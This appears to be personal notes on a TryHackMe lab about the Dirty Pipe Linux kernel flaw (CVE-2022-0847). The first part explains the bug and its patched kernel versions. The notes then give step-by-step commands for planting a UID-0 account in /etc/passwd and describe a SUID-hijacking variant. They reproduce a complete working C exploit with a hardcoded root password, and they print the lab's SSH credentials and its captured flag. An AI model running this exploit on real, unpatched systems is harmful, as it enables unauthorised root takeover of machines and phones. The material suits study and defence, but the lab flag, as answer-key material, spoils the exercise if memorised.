In March 2022, a researcher named Max Kellerman publicly disclosed a Linux Kernel vulnerability (nicknamed "Dirty Pipe" for its similarities to the notorious "[Dirty Cow](https://dirtycow.ninja/)" exploit affecting older versions of the kernel) that allowed attackers to arbitrarily overwrite files on the operating system. The vulnerability was responsibly disclosed in early 2022 and was [publicly released in a blog post](https://dirtypipe.cm4all.com/) written by Max Kellerman soon after patches were made available.

Arbitrary file overwrites at the kernel level can be very easily leveraged to escalate privileges on the machine (i.e. to obtain administrator, or "root" privileges). This is a devastating vulnerability, made more so by its reach: any devices running a vulnerable version of the Linux kernel (including Android phones) are affected!  

This room will provide an overview of the vulnerability, as well as give you an opportunity to exploit it for yourself in the vulnerable machine attached to this task. We will start by taking a look at the vulnerability and exploit at a high-level, before moving on to exploiting the vulnerability in subsequent sections of the room.

---

**Overview**

Due to their low-level nature, any in-depth discussion of kernel vulnerabilities quickly becomes rather complicated. As such we will keep the information in this task relatively light, in the interests of keeping the information easy to digest. If you would like to read an in-depth explanation of the vulnerability (including a full code analysis), you are highly encouraged to check out Max Kellerman's [original blog post](https://dirtypipe.cm4all.com/).

Before continuing with this task, it is important to note that Dirty Pipe has been fixed in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102, so if you use or manage any Linux (or Android) devices, make sure that they are running a kernel greater than one of these versions!


**Theory**

In order to understand how Dirty Pipe works, we must first look at how the Linux Kernel manages memory.

The smallest unit of memory controlled by the CPU is called a _page_ — these are usually about 4Kib in modern systems. Of relevance to this room, pages are used when reading and writing files from the disk, although they have many other uses. The part of the kernel that manages pages is referred to as the _page cache_.

When a process attempts to open a file, the kernel loads it into pages which are then made available to the userland process. This userland access can be granted either by being copied into user-space memory, or by keeping the pages in kernel-space but making them accessible via _system calls_ (effectively special functions which are used to interact with the kernel).

---

Okay, so what does this have to do with Dirty Pipe? The vulnerability arises because of how the kernel implements "pipes".

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/5220b70c8ff67820dabb1156a666f816.png)You will likely be familiar with the idea of "anonymous pipes" — these are featured in most shell scripting languages and allow you to pass data between two processes, usually with the _pipe character_ (`|`). Pipes are characterised as having two ends — one for reading, and one for writing; you can see this for yourself in the way that anonymous pipes take the standard output of a process and _write_ it into a pipe where it can be _read_ by the standard input of the next program in the chain.  

Back on topic: the Linux kernel provides a system call called "`splice()`", which is effectively a shortcut designed to speed up the process of pushing the contents of a file into a pipe. This optimisation is achieved by moving _references_ to the pages storing the file contents, rather than moving the entirety of the data. In other words, `splice()` allows us to point a pipe at a page which is already loaded into memory, containing a section of a file originally opened by a process requesting read-only access. See where this is going?

By splicing a page into the pipe then writing our own arbitrary data to the pipe, we can overwrite the contents of the page!

---

It's not quite that simple, however; we are still missing one final piece of the puzzle. _Usually_ when you write to a pipe after splicing a file, a new `pipe_buffer` is created to avoid overwriting the spliced data. So, how do we force the kernel to allow us to overwrite the relevant page(s)?  

This is the real crux of the vulnerability, and it can all be traced back to two commits in the Linux kernel:

- A bug was introduced in [Linux Kernel v4.9 (2016)](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b) which allowed pipes to be created with arbitrary flags. None of the flags available at the time were in any way dangerous, so this wasn't an issue, until...  
    
- [Linux Kernel v5.8 (2020)](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958) added a new flag — `PIPE_BUF_FLAG_CAN_MERGE` . In simple terms, this flag tells the kernel that the page can be updated without forcing a rewrite of the data.  
    

To summarise: we have a flag that allows us to tell the kernel that it's okay to overwrite the data in a page, we have a bug that allows us to specify arbitrary flags for a pipe, and we have a system call that inadvertently allows us to point pipes at page buffers which were opened as read-only. What could possibly go wrong?  

Put simply, the exploit first opens a target file with the read-only flag set — in order to do this, we must choose a file that we have permission to read. The exploit then prepares a pipe in a special way, forcing the addition of the `PIPE_BUF_FLAG_CAN_MERGE` flag. Next, it uses `splice()` to make the pipe point at the desired section of the target file. Finally, it writes whatever arbitrary data that the user has specified into the pipe, overwriting the target page by merit of the `PIPE_BUF_FLAG_CAN_MERGE` flag.  

**The Effects**

So, what does this all mean?

In short, it means that, with the right code, we can arbitrarily overwrite any file on the system, provided we can open it for reading. In other words: if our user has read access over the file (regardless of other permissions or mutability) then we can also write to it. Interestingly, this also applies to read-only file systems, or otherwise protected files which the kernel would usually stop us from writing to; by exploiting the kernel vulnerability and circumventing the "usual" write methods, we also bypass these protections. It's important to note that the changes will not actually be permanent until the kernel chooses to reclaim the memory used by the page (at which point the page gets dumped to the disk). Restarting the device or clearing the page cache manually before the kernel reclaims the memory will revert the file back to its original contents.  

**Remediations**

Fortunately, the remediation for this vulnerability is very simple: update your kernel.

Patched versions of the Linux Kernel have been released for supported major kernel versions — specifically, the vulnerability has been patched in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102.

Ensure that you apply updates to all of your Linux devices (including any Android) as soon as security patches are released.

---

**Connecting to the target**

This lab can be accessed in one of two ways:

- Using the in-browser machine on the right-hand side of the screen. This should have appeared automatically when you deployed the target.  
    
- Using SSH from a local attacking machine or the TryHackMe AttackBox. The credentials for this are:
    
    - **Username:** `tryhackme`
    - **Password:** `TryHackMe123!`
    
    i.e. `ssh tryhackme@10.10.130.240`

Pick a method and access the target for yourself!

  

**The Exploit**

In the previous task we looked at the background of the exploit and how it works. In this task we will be exploiting the vulnerability for ourselves!

A copy of Max Kellerman's original proof of concept exploit code (originally found in the [disclosure blog post](https://dirtypipe.cm4all.com/)) can be found on the target machine at `/home/tryhackme/Exploit/PoC/poc.c`. Once compiled, this exploit gives us a lot of control over how we abuse the Dirty Pipe vulnerability. Specifically, it lets us specify the _file_ we want to overwrite, the _offset_ we would like to overwrite it at, and the _content_ we would like to insert. We will acquire each of these things in the following paragraphs. An interactive video clip will be provided at the end of the task to assist with comprehension and debugging of the steps outlined in the following sections.  

---

Bearing in mind that the exploit won't let us _create_ files (we can only overwrite information in existing files), we first need to find a file our user can _read_, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is `/etc/passwd`. Whilst password hashes are usually stored in the restricted-access `/etc/shadow` in modern Linux systems (as opposed to being stored traditionally in `/etc/passwd`), most Linux variants do still check to see if account password hashes are given in `/etc/passwd`. This means that we can write a user with root permissions and a known password hash directly into the passwd file!

_**Note:** If you are familiar with privilege escalation due to a writeable `/etc/passwd` file, skip to the next paragraph — otherwise click on the box below to read more about this technique._  

_Background Knowledge: The Passwd File 

Let's break this down in a little more detail.

Passwd entries are comprised of 7 _fields_, separated by colons (`:`). For example: `root:x:0:0:root:/root:/bin/bash`.

In order, these fields are:

- The username (`root`)
- The user's password hash. In most cases the hash will not actually be given here and instead will be replaced with an `x`. This means that the hash can instead be found in `/etc/shadow`.
- The user's UID (**U**ser **ID**) — as the root user, this is `0`.
- The user's GID (**G**roup **ID**). For the root user this will also be `0`.
- A description of the account. This is simply "`root`" in the example, however, it can be left blank.
- The user's home directory (`/root`)
- The user's login shell (`/bin/bash`)

If we can manually form our own entry (including a full password hash) and insert it into the passwd file then we can create a new user account. Interestingly, Linux doesn't check to confirm that the UID and GID of an account are unique — only that usernames are unique. In other words, we can create an account with our own unique username that has a UID and GID of `0`, effectively giving our new account the same permissions as the root account!

Let's generate a password hash and form a valid passwd entry before moving on. Pick a password then use the `openssl` command to create a SHA512Crypt hash of your chosen password:

Generating a SHA512Crypt Hash

```php
openssl passwd -6 --salt THM
```

Finally, insert your username and hash into this passwd entry template: `USERNAME:HASH:0:0::/root:/bin/bash`.

Your entry should look something like this:  
`muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash`

_**Note:** The password:_ `TryHackMe123!` _has been used to generate the example hash above._

As we are overwriting existing entries in the password file, we also need to add a new line on at the end of our entry. This ensures that we avoid corrupting our entry with any remnants of the previous contents of the line.

Our final content should therefore look something like this (quotes included):  
`'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash   '`  
  

---

We have our _file_ (`/etc/passwd`) and our _content_ (the passwd entry) — all we need now is the _offset_. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.

The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite _several_ accounts. Looking through the passwd file, the `games` account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use `grep` with the `-b` switch to find the offset of `games` from the start of the file:

Finding the Offset

```php
tryhackme@dirty-pipe:~$ grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```


The offset is revealed to be `189`, giving us the final piece of our puzzle.  

---

We are finally ready to go!  

The program can be compiled using the following commands:

Compilation Command

```php
tryhackme@dirty-pipe:~$ cd ~/Exploit/PoC 
tryhackme@dirty-pipe:~/Exploit/PoC$ gcc poc.c -o exploit 
tryhackme@dirty-pipe:~/Exploit/PoC$ ls poc.c  exploit
```

This moves to the directory containing the exploit code, then compiles it with `gcc`.

Before we perform the exploit, it's very important that we backup the `/etc/passwd` file. This is a disruptive exploit which _will_ cause damage to the system (for a while at the very least); with the passwd file backed up, we can easily revert the damage after the exploit has been completed.

Use `cp /etc/passwd /tmp/passwd` to copy the passwd file to `/tmp`, then execute the exploit!

Your command should look something like this:

Executing the Exploit

```php
tryhackme@dirty-pipe:~/Exploit/PoC$ ./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash 
> '
```

---

Steps:
- cat /etc/passwd
- Pick a password then use the `openssl` command to create a SHA512Crypt hash of your chosen password:
```php
openssl passwd -6 --salt THM "pass123"
```
- Finally, insert your username and hash into this passwd entry template: 
```php
USERNAME:HASH:0:0::/root:/bin/bash
```
- Create pass file it should look like this with a new line:
```php
'USERNAME:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash   
'
```
- Find offset
```php
grep -b "games" /etc/passwd
```
- Results: `189:games:x:5:60:games:/usr/games:/usr/sbin/nologin`
- Compile exploit
```php
gcc poc.c -o exploit
```
- Backup:  `cp /etc/passwd /tmp/passwd` to copy the passwd file to `/tmp`, then execute the exploit!
```php
cp /etc/passwd /tmp/passwd
```
- Run
```php
./exploit /etc/passwd 189
```

Example file with pass123 as the salted password:
```php
'zod:$6$THM$iNCtUUA0xRzUIYVVu4GwzlSVTO/5ZNJG/KPhE/wkQgsVhRSkxvhAzcGGCyPZsoV1s.wGG11NZU5nTGoSyw6zj1:0:0::/root:/bin/bash
'  
```
- Usage: ./exploit TARGETFILE OFFSET DATA, so everything is one command
```php
./exploit /etc/passwd 189 'zod:$6$THM$nwMbCgA5OWcuIxKpVs5cZcqO2DC4GcL1MZ77Fl2HydfpVojdZhc6HA0ThSos2gczyUiKl2SZ7TLx.VTxuqR/w1:0:0::/root:/bin/bash                                           '
```

![[Pasted image 20240713055944.png]]

---

Switch user (`su`) into your newly created root account.  
What is the flag found in the `/root/flag.txt` file?
_I had to modify the entry to make sure it was on two lines, it should have this indicator: > '_

![[Pasted image 20240713062758.png]]

It should look like this in mousepad if you have any problems:
![[Pasted image 20240713081537.png]]

**Flag.txt:** THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}

![[Pasted image 20240713081705.png]]

---

**Overview**

In the previous task, we exploited the Dirty Pipe vulnerability using Max Kellerman's original proof of concept exploit code; however, other exploits have since been released. The original PoC allowed us to overwrite any file with arbitrary data at an offset of our choosing; however, other implementations have abused the arbitrary file write vulnerability in a variety of different ways.

To demonstrate this concept, a second exploit script has been added to the lab machine — this can be found on the target at `/home/tryhackme/Exploit/Bl4sty/dirtypipez.c`. As the directory structure suggests, this implementation was coded by [@bl4sty](https://twitter.com/bl4sty/), a security researcher who you may remember if you have already completed the "[SudoVulns: Baron Samedit](https://tryhackme.com/room/sudovulnssamedit)" room. The original exploit code can be downloaded from bl4sty's website [here](https://haxx.in/files/dirtypipez.c); however, as mentioned previously, a copy has already been added to the lab machine.

This exploit takes the arbitrary file write one stage further by abusing a rather special quality of the vulnerability. SUID Programs usually lose their [SUID bit](https://muirlandoracle.co.uk/2020/03/05/unix-file-permissions/#SUID) when you attempt to write to them; however, this does not happen with Dirty Pipe — in other words, we can write to any program that has permission to execute with higher privileges, without inadvertently destroying that extra permission (as would usually happen).

Bl4sty's exploit capitalises on this. Instead of overwriting a file like `/etc/passwd`, it overwrites a user-specified SUID binary (such as `/bin/su`), injecting shellcode into it which then gets executed with the permissions of the privileged user (i.e. `root`). Specifically, the exploit hijacks the chosen SUID binary and forces it to create a backdoor binary in  `/tmp` which has the SUID bit and calls `/bin/sh`. It then restores the targeted SUID binary to full working order by re-adding the overwritten section, and uses the newly created backdoor to grant the attacker a shell as the privileged user.

  

**Exploitation**

Before continuing with this task, please ensure that you have exited your session as the root user. You should once again be executing commands in the context of the `tryhackme` user.

As the `tryhackme` user, compile the exploit using the same syntax as was given in the previous task, e.g.:

```php
gcc dirtypipez.c -o exploit
```

With the exploit compiled, it should be run with a single argument specifying a target binary, owned by root and with the SUID bit set, for example: `./exploit /bin/su`

---

Exploit the target using bl4sty's exploit for Dirty Pipe  

Make sure to clean up after yourself!

Remove the SUID binary created by the script (`/tmp/sh`).  

**[Optional]** Find another exploit for this vulnerability online. Review the code to ensure that it does what it claims to do, then upload it to the target and attempt to exploit the vulnerability a third way.

---

![[Pasted image 20240713082311.png]]

https://github.com/n3rada/DirtyPipe/blob/main/dpipe.c

## Code
 
```c
/*
 *
 * Dirty Pipe
 * vulnerability (CVE-2022-0847)
 *
 * Compile as static binary:
 * gcc -o dpipe dpipe.c -static
 *
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <limits.h>


static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get pipe size");
        abort();
    }
    printf("[Dirty Pipe] Pipe size determined: %u bytes\n", pipe_size);

    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    printf("[Dirty Pipe] Filling the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe filled successfully.\n");

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    printf("[Dirty Pipe] Draining the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe drained successfully.\n");

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}


int backup_file(const char *src_path)
{
    char *filename = basename(strdupa(src_path));

    char dst_path[PATH_MAX];
    snprintf(dst_path, sizeof(dst_path), "/tmp/%s.bak", filename);

    printf("[Dirty Pipe] Attempting to backup '%s' to '%s'\n", src_path, dst_path);

    FILE *f1 = fopen(src_path, "r");
    if (f1 == NULL)
    {
        perror("[Dirty Pipe] Error opening source file for reading");
        return EXIT_FAILURE;
    }

    FILE *f2 = fopen(dst_path, "w");
    if (f2 == NULL)
    {
        fclose(f1);
        perror("[Dirty Pipe] Error opening destination file for writing");
        return EXIT_FAILURE;
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

    printf("[Dirty Pipe] Successfully backed up '%s' to '%s'\n", src_path, dst_path);
    return EXIT_SUCCESS;
}

int write_to_file(const char *path, loff_t offset, const char *data)
{
    printf("[Dirty Pipe] Initiating write to '%s'...\n", path);

    const size_t data_size = strlen(data);
    printf("[Dirty Pipe] Data size to write: %zu bytes\n", data_size);

    long page_size = sysconf(_SC_PAGESIZE);

    if (page_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get page size");
        exit(EXIT_FAILURE);
    }

    if (offset % page_size == 0) {
        fprintf(stderr, "[Dirty Pipe] Error: Writing cannot start at a page boundary.\n");
        exit(EXIT_FAILURE);
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;

    // Ensure we're not writing across a page boundary.
    if (end_offset > next_page) {
		fprintf(stderr, "[Dirty Pipe] Error: Writing cannot cross a page boundary.\n");
		return EXIT_FAILURE;
	}

	// Open the file for reading.
	const int fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("[Dirty Pipe] Error: Failed to open the file");
		return EXIT_FAILURE;
	}
    printf("[Dirty Pipe] File '%s' opened successfully for reading.\n", path);

	// Get file statistics.
	struct stat st;
	if (fstat(fd, &st)) {
		perror("[Dirty Pipe] Error: Failed to retrieve file stats");
		return EXIT_FAILURE;
	}

    // Check if the offset is inside the file.
	if (offset > st.st_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Specified offset is beyond the file size.\n");
		return EXIT_FAILURE;
	}

    // Ensure writing won't enlarge the file.
	if (end_offset > st.st_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Writing will enlarge the file, which is not allowed.\n");
		return EXIT_FAILURE;
	}

    // Create a pipe for data transfer.
	int p[2];
	prepare_pipe(p);

    // Adjust the offset by decreasing it.
	--offset;

    // Use splice() to move data within the filesystem.
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("[Dirty Pipe] Error: Splice operation failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "[Dirty Pipe] Error: Splice operation transferred fewer bytes than expected.\n");
		return EXIT_FAILURE;
	}

    // Write the actual data to the pipe.
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("[Dirty Pipe] Error: Failed to write data to the pipe");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Wrote fewer bytes to the pipe than expected.\n");
		return EXIT_FAILURE;
	}
    printf("[Dirty Pipe] Data successfully written to '%s'.\n", path);

    return EXIT_SUCCESS;
}

void print_help(const char *progname) {
    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "  %s [--no-backup] [--root]\n", progname);
    fprintf(stderr, "  %s [--no-backup] <file_path> <offset> <data>\n", progname);
    fprintf(stderr, "\nOptions:\n");
    fprintf(stderr, "  --no-backup  Do not create a backup of the file before writing.\n");
    fprintf(stderr, "  --root        Apply root exploit on /etc/passwd.\n");
}

void handle_root_exploit(int no_backup) {
    if (!no_backup && backup_file("/etc/passwd") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file("/etc/passwd", 4, ":$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh\n") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
    printf("[Dirty Pipe] You can connect as root with password 'el3ph@nt!'\n");
}

void handle_custom_file(int no_backup, char *argv[], int index_shift) {
    const char *file_path = argv[1 + index_shift];
    loff_t offset = strtoll(argv[2 + index_shift], NULL, 10);
    const char *data = argv[3 + index_shift];

    if (!no_backup && backup_file(file_path) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file(file_path, offset, data) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[])
{
    int no_backup = 0;
    int index_shift = 0;

    // Check for the --no-backup option.
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-backup") == 0) {
            no_backup = 1;
            index_shift++;
        }
        // Check for help flags.
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_help(argv[0]);
            return EXIT_SUCCESS;
        }
    }

    if (argc < 2 + index_shift)
    {
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (strcmp(argv[1 + index_shift], "--root") == 0) {
        handle_root_exploit(no_backup);
    } else if (argc == 4 + index_shift) {
        handle_custom_file(no_backup, argv, index_shift);
    } else {
        fprintf(stderr, "[Dirty Pipe] Error: Invalid arguments!\n");
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    printf("[Dirty Pipe] Program execution completed successfully.\n");
    return EXIT_SUCCESS;
}
```

Lets see if it works:

![[Pasted image 20240713083708.png]]

Pass:
el3ph@nt!

![[Pasted image 20240713083832.png]]

---

